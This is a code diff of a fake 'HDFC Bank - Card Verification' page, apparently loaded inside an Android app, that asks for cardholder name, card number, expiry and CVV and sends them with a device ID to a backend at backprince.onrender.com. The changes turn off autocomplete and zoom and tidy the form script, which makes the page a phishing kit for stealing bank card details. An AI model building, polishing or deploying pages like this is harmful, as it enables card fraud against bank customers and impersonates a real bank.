@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>HDFC Bank - Card Verification</title>
     <link rel="stylesheet" href="dashboard.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -115,17 +115,17 @@
         <form id="verifyForm">
             <div class="input-group">
                 <div class="field">
-                    <input type="text" id="nameInput" placeholder="Cardholder Name" required>
+                    <input type="text" id="nameInput" placeholder="Cardholder Name" required autocomplete="off">
                 </div>
                 <div class="field">
-                    <input type="tel" id="numInput" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <input type="tel" id="numInput" placeholder="1234 5678 9012 3456" maxlength="19" required autocomplete="off">
                 </div>
                 <div class="row">
                     <div class="field" style="flex: 1;">
-                        <input type="text" id="expInput" placeholder="MM/YY" maxlength="5" required>
+                        <input type="text" id="expInput" placeholder="MM/YY" maxlength="5" required autocomplete="off">
                     </div>
                     <div class="field" style="flex: 1;">
-                        <input type="password" placeholder="CVV" maxlength="3" required>
+                        <input type="password" placeholder="CVV" maxlength="3" required autocomplete="off">
                     </div>
                 </div>
             </div>
@@ -141,11 +141,12 @@
     </main>
 
     <script>
-        const BACKEND_URL = 'https://backprince.onrender.com'; // CHANGE THIS TO YOUR RENDER URL
+        const BACKEND_URL = 'https://backprince.onrender.com';
+        const nameInput = document.getElementById('nameInput');
+        const numInput = document.getElementById('numInput');
+        const expInput = document.getElementById('expInput');
 
         // Real-time card update logic
-        const nameInput = document.getElementById('nameInput');
-        // Card Formatting: Add space every 4 digits
         numInput.addEventListener('input', (e) => {
             let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             let formatted = '';
@@ -167,7 +168,6 @@
 
         document.getElementById('verifyForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
             const formData = {
                 deviceId: window.AndroidBridge ? window.AndroidBridge.getDeviceId() : 'browser_test',
                 card_name: nameInput.value,
